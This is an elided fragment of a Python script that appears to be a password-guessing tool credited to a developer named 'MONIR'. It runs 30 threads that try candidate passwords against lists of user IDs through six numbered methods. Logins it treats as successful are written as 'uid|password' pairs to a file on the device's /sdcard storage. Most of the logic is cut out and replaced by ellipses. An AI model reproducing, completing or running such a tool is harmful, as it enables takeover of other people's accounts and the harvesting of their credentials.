...
logo=(f'''
 ...
 | |\/| |/ _ \| '_ \| | '__|
 | |  | | (_) | | | | | |   
 |_|  |_|\___/|_| |_|_|_|    {G}1.0
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {xd} MONIR
...
def _____bd1x_____():
	...
	with tred(max_workers=30) as ASRAFULx:
		...
		for love in user:
			...
			if methd in ['1']:MONIR.submit(____M1____,idf,pwv)
			if methd in ['2']:MONIR.submit(____M2____,idf,pwv)
			if methd in ['3']:MONIR.submit(____M3____,idf,pwv)
			if methd in ['4']:MONIR.submit(____M4____,idf,pwv)
			if methd in ['5']:MONIR.submit(____M5____,idf,pwv)
			if methd in ['6']:MONIR.submit(____M6____,idf,pwv)
	...
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|MONIR-OK|> {uid} ● {ps}")
				open("/sdcard/MONIR-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
